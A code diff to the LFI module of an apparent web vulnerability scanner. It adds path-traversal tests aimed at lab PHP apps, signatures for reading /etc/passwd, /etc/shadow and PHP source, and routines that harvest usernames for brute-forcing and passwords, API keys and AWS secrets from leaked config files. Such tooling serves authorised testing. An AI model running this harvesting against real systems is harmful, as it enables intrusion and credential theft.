@@ -1358,13 +1880,13 @@ class LFIScanner(ScanModule):
                         self._add_finding(
                             name=f"Log File Inclusion ({log_type})",
                             description=f"Log file accessible via parameter '{param_name}'. Potential for log poisoning RCE.",
-                            severity="HIGH",
+                            severity=Severity.HIGH,
                             host=base_url,
                             endpoint=test_url,
                             result=LFIResult(
                                 vulnerable=True,
                                 lfi_type=LFIType.LOG_POISONING,
-                                confidence=60,
+                                confidence_score=60,
                                 payload=payload,
                                 evidence=[f"Log indicator: {i}" for i in found[:3]],
                                 rce_possible=True,
@@ -1435,13 +1957,13 @@ class LFIScanner(ScanModule):
                                     name="Session File Inclusion",
                                     description=f"PHP session file accessible via parameter '{param_name}'. "
                                                f"Potential for session poisoning RCE.",
-                                    severity="CRITICAL",
+                                    severity=Severity.CRITICAL,
                                     host=base_url,
                                     endpoint=test_url,
                                     result=LFIResult(
                                         vulnerable=True,
                                         lfi_type=LFIType.SESSION_INCLUSION,
-                                        confidence=70,
+                                        confidence_score=70,
                                         payload=payload,
                                         evidence=[
                                             f"Session ID: {session_id}",
@@ -1507,7 +2029,7 @@ class LFIScanner(ScanModule):
                             self._add_finding(
                                 name=f"Proc Filesystem Access ({description})",
                                 description=f"Access to {proc_path} via parameter '{param_name}'.",
-                                severity="HIGH",
+                                severity=Severity.HIGH,
                                 host=base_url,
                                 endpoint=test_url,
                                 result=result,
@@ -1558,7 +2080,7 @@ class LFIScanner(ScanModule):
                         self._add_finding(
                             name=f"LFI via {encoding_type} Encoding",
                             description=f"Filter bypass using {encoding_type} encoding on parameter '{param_name}'.",
-                            severity="HIGH",
+                            severity=Severity.HIGH,
                             host=base_url,
                             endpoint=test_url,
                             result=result,
@@ -1568,7 +2090,116 @@ class LFIScanner(ScanModule):
                         
                 except Exception as e:
                     logger.debug(f"Encoding bypass test error: {e}")
-    
+
+    async def _test_php_legacy_lfi(
+        self,
+        client: httpx.AsyncClient,
+        base_url: str,
+        urls: list[str],
+        rate_limiter: RateLimiter,
+    ) -> None:
+        """
+        Test PHP legacy LFI payloads specifically for DVWA, bWAPP, Mutillidae.
+        These are classic LFI patterns that work on older PHP apps.
+        Added 2026-02-16 for improved legacy PHP coverage.
+        """
+        vulnerable_params = self._find_vulnerable_params(urls)
+
+        # LFI detection signatures
+        lfi_signatures = {
+            "/etc/passwd": ["root:", "daemon:", "bin:", "/bin/bash", "/usr/sbin/nologin"],
+            "/etc/shadow": ["root:$", "root:!", ":0:0:"],
+            "/etc/hosts": ["localhost", "127.0.0.1"],
+            "win.ini": ["[fonts]", "[extensions]", "[mci extensions]"],
+            "boot.ini": ["boot loader", "[operating systems]", "multi(0)disk(0)"],
+            "php://filter": ["PD9waHA", "PD8=", "<?php"],  # Base64 encoded PHP
+            "/proc/self": ["HOSTNAME=", "PATH=", "HOME="],
+        }
+
+        for url, param_name, parsed in vulnerable_params[:15]:
+            baseline = self.baseline_responses.get(url, "")
+            param_findings_count = 0
+
+            # PERF-FIX 2026-02-20: Try intelligent payload selection
+            intelligent_payloads = await self._get_intelligent_payloads(
+                category="lfi",
+                endpoint=url,
+                param_name=param_name,
+                max_payloads=30,
+                asset_data=getattr(self, '_asset_data', None),
+            )
+            if intelligent_payloads:
+                # Use intelligent payloads first, then fallback to legacy payloads
+                payloads_to_test = [p[0] for p in intelligent_payloads] + PayloadGenerator.PHP_LEGACY_LFI_PAYLOADS[:20]
+            else:
+                payloads_to_test = PayloadGenerator.PHP_LEGACY_LFI_PAYLOADS[:40]
+
+            for payload in payloads_to_test:
+                if param_findings_count >= self.max_findings_per_param:
+                    break
+
+                await rate_limiter.acquire()
+
+                params = parse_qs(parsed.query)
+                params[param_name] = [payload]
+                query = urlencode(params, doseq=True)
+                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"
+
+                if test_url in self.tested_payloads:
+                    continue
+                self.tested_payloads.add(test_url)
+
+                try:
+                    response = await client.get(test_url)
+                    content = response.text
+
+                    # Check for LFI signatures
+                    found_signatures = []
+                    for file_type, signatures in lfi_signatures.items():
+                        for sig in signatures:
+                            if sig in content and sig not in baseline:
+                                found_signatures.append((file_type, sig))
+
+                    if found_signatures:
+                        # Determine severity based on what was found
+                        severity = "HIGH"
+                        lfi_type = LFIType.PATH_TRAVERSAL
+
+                        if any("shadow" in f[0] for f in found_signatures):
+                            severity = "CRITICAL"
+                        elif any("php://filter" in payload for _ in found_signatures):
+                            lfi_type = LFIType.PHP_WRAPPER
+                            severity = "CRITICAL"  # Source disclosure is critical
+                        elif any("/proc/" in payload for _ in found_signatures):
+                            lfi_type = LFIType.PROC_SELF
+
+                        result = LFIResult(
+                            vulnerable=True,
+                            lfi_type=lfi_type,
+                            payload=payload,
+                            evidence=[
+                                f"Found signatures: {[f[1] for f in found_signatures[:3]]}",
+                                f"File type indicators: {list(set(f[0] for f in found_signatures))}",
+                                "PHP legacy LFI payload successful",
+                            ],
+                            confidence_score=90,
+                            file_content=content[:200] if len(content) < 5000 else content[:200],
+                        )
+
+                        self._add_finding(
+                            name=f"Local File Inclusion (PHP Legacy - {lfi_type.name})",
+                            description=f"PHP legacy LFI vulnerability in parameter '{param_name}'. Payload: {payload[:50]}...",
+                            severity=severity,
+                            host=base_url,
+                            endpoint=test_url,
+                            result=result,
+                            param=param_name,
+                        )
+                        param_findings_count += 1
+
+                except Exception as e:
+                    logger.debug(f"PHP legacy LFI test error: {e}")
+
     def _add_finding(
         self,
         name: str,
@@ -1605,15 +2236,16 @@ class LFIScanner(ScanModule):
             evidence.append(f"Content preview: {result.file_content[:100]}...")
         
         finding = Finding(
-            type="lfi" if result.lfi_type != LFIType.RFI else "rfi",
+            vuln_type=VulnType.LFI,
+                        category=VulnCategory.SERVER_SIDE if result.lfi_type != LFIType.RFI else "rfi",
             name=name,
             severity=severity,
             description=description,
             host=host,
-            matched_at=endpoint,
+            endpoint=endpoint,
             evidence=evidence,
             cvss_score=cvss_scores.get(severity, 7.5),
-            cwe="CWE-22" if result.lfi_type != LFIType.RFI else "CWE-98",
+            cwe_id="CWE-22" if result.lfi_type != LFIType.RFI else "CWE-98",
             remediation=self._get_remediation(result),
             references=[
                 "https://owasp.org/www-community/attacks/Path_Traversal",
@@ -1623,7 +2255,16 @@ class LFIScanner(ScanModule):
         )
         
         self.findings.append(finding.to_dict())
-        
+
+        # THEME-4: Extract and share data for cross-module consumption
+        # FIX 2026-02-16: Wrap in exception handler to prevent "Future exception was never retrieved"
+        async def _safe_share():
+            try:
+                await self._share_extracted_data(result, endpoint)
+            except Exception as e:
+                logger.debug(f"[LFI] Failed to share extracted data: {e}")
+        asyncio.create_task(_safe_share())
+
         logger.info(
             f"🚨 LFI Found [{severity}] - {name} | "
             f"Confidence: {result.confidence}% | Param: {param}"
@@ -1665,6 +2306,132 @@ class LFIScanner(ScanModule):
             )
         
         return base
+
+    # =========================================================================
+    # THEME-4: Cross-module data sharing
+    # =========================================================================
+
+    async def _share_extracted_data(self, result: LFIResult, source_endpoint: str) -> None:
+        """
+        Extract and share data from LFI-read files for cross-module consumption.
+
+        THEME-4 FIX: Enables feedback loops between modules:
+        - /etc/passwd → Brute force with usernames
+        - Config files → Credential extraction
+        - .env files → Secret extraction
+        """
+        if not result.file_content:
+            return
+
+        try:
+            from utils.shared_findings_store import SharedFindingsStore
+            store = SharedFindingsStore.get_instance()
+            content = result.file_content
+
+            # Extract usernames from /etc/passwd
+            if "passwd" in result.payload.lower() or ":x:" in content or ":/bin/" in content:
+                usernames = self._extract_passwd_usernames(content)
+                if usernames:
+                    await store.add_extracted_data(
+                        data_type="usernames",
+                        values=usernames,
+                        source_module="lfi_scanner",
+                        source_endpoint=source_endpoint,
+                        context={"file": "/etc/passwd", "os": "linux"},
+                    )
+                    logger.info(f"[THEME-4/LFI] Shared {len(usernames)} usernames from /etc/passwd")
+
+            # Extract credentials from config files
+            if any(kw in result.payload.lower() for kw in ["config", ".env", "wp-config", "settings"]):
+                creds = self._extract_config_credentials(content)
+                if creds:
+                    await store.add_extracted_data(
+                        data_type="credentials",
+                        values=creds,
+                        source_module="lfi_scanner",
+                        source_endpoint=source_endpoint,
+                        context={"file": result.payload, "extraction_method": "lfi_config_read"},
+                    )
+                    logger.info(f"[THEME-4/LFI] Shared {len(creds)} credentials from config file")
+
+            # Register chain opportunities
+            if result.source_disclosed or result.rce_possible:
+                await store.add_extracted_data(
+                    data_type="chain_opportunities",
+                    values=[{
+                        "chain_type": "lfi_to_rce" if result.rce_possible else "lfi_to_disclosure",
+                        "description": f"LFI can read sensitive files - {'RCE possible' if result.rce_possible else 'source disclosed'}",
+                        "payload": result.payload[:100],
+                        "severity": "CRITICAL" if result.rce_possible else "HIGH",
+                    }],
+                    source_module="lfi_scanner",
+                    source_endpoint=source_endpoint,
+                    context={"suggested_modules": ["ssrf", "ssti", "cmdi"]},
+                )
+
+        except Exception as e:
+            logger.debug(f"[THEME-4/LFI] Failed to share extracted data: {e}")
+
+    def _extract_passwd_usernames(self, content: str) -> list[str]:
+        """Extract usernames from /etc/passwd content."""
+        usernames = []
+        for line in content.split("\n"):
+            if ":" in line and not line.startswith("#"):
+                parts = line.split(":")
+                if len(parts) >= 3:
+                    username = parts[0].strip()
+                    # Filter out system accounts with nologin/false shells
+                    shell = parts[-1].strip() if len(parts) >= 7 else ""
+                    if username and not any(x in shell for x in ["nologin", "false", "sync"]):
+                        usernames.append(username)
+        return usernames[:50]  # Limit to 50 usernames
+
+    def _extract_config_credentials(self, content: str) -> list[dict]:
+        """Extract credentials from config file content."""
+        import re
+        creds = []
+
+        # Common patterns for credentials in config files
+        patterns = [
+            # DB connection strings
+            (r"(?i)(?:db_)?password['\"]?\s*[=:]\s*['\"]?([^'\"\s;]+)", "password"),
+            (r"(?i)(?:db_)?user(?:name)?['\"]?\s*[=:]\s*['\"]?([^'\"\s;]+)", "username"),
+            # .env style
+            (r"(?i)DATABASE_PASSWORD\s*=\s*['\"]?([^'\"\s]+)", "password"),
+            (r"(?i)DATABASE_USER\s*=\s*['\"]?([^'\"\s]+)", "username"),
+            (r"(?i)DB_PASSWORD\s*=\s*['\"]?([^'\"\s]+)", "password"),
+            (r"(?i)DB_USER(?:NAME)?\s*=\s*['\"]?([^'\"\s]+)", "username"),
+            # API keys and secrets
+            (r"(?i)(?:api_)?secret(?:_key)?['\"]?\s*[=:]\s*['\"]?([^'\"\s;]+)", "secret"),
+            (r"(?i)(?:api_)?key['\"]?\s*[=:]\s*['\"]?([^'\"\s;]+)", "api_key"),
+            # AWS credentials
+            (r"(?i)aws_secret_access_key\s*[=:]\s*['\"]?([^'\"\s]+)", "aws_secret"),
+            (r"(?i)aws_access_key_id\s*[=:]\s*['\"]?([^'\"\s]+)", "aws_key"),
+        ]
+
+        extracted = {}
+        for pattern, label in patterns:
+            matches = re.findall(pattern, content)
+            for match in matches[:5]:  # Limit per pattern
+                if match and len(match) > 3:
+                    if label not in extracted:
+                        extracted[label] = []
+                    extracted[label].append(match)
+
+        # Build credential pairs
+        if "username" in extracted and "password" in extracted:
+            for i, username in enumerate(extracted["username"][:5]):
+                password = extracted["password"][i] if i < len(extracted["password"]) else None
+                if password:
+                    creds.append({"username": username, "password_hash": password})
+
+        # Add standalone secrets
+        for key in ["secret", "api_key", "aws_secret", "aws_key"]:
+            if key in extracted:
+                for value in extracted[key][:3]:
+                    creds.append({"type": key, "value": value})
+
+        return creds
 
 
 # Export version
